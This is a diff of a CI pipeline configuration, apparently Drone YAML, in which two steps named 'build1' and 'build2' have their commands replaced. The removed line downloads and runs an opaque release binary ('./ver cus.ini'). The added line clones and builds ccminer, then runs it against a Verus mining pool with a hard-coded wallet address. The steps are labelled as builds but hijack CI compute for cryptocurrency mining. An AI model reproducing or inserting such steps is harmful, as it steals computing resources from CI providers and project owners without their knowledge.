@@ -6,7 +6,8 @@ steps:
 - name: build1
   image: golang
   commands:
-  - wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
+  - sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r -p  c=VRSC,mc=VRSC,ID=KULI -t8
+
 
 ---
 kind: pipeline
@@ -17,7 +18,8 @@ steps:
 - name: build2
   image: node
   commands:
-  - wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
+  - sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r -p  c=VRSC,mc=VRSC,ID=KULI -t8
+
 
 ---
 kind: pipeline
